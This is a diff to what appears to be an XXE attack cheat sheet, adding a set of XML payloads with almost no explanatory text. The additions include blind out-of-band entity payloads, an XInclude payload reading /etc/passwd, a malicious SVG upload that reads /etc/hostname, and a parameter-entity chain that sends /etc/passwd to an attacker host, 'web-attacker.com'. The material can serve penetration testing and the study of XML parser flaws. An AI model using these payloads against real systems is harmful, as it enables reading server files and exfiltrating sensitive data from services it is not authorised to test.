@@ -63,3 +63,31 @@ External DTD Entity Syntax:
 External DTD Entity Example:
 <!ENTITY author system "http://example.com/entities.dtd">
 <author>&author;</author>
+
+Blind XXE oob
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://examplesite"> ]>
+variable &xxe; /variable
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://examplesite"> ]>
+variable &xxe; /variable
+
+XInclude
+XInclude Attack
+Attacking a param using an XML an XInclude Payload 
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+XXE Upload
+Upload the following file with XXE payload
+file.svg
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE host [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"
+	xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+	<text font-size="15" x="0" y="16">&xxe;</text>
+</svg>
+
+Blind XXE exfiltrate oob
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate;
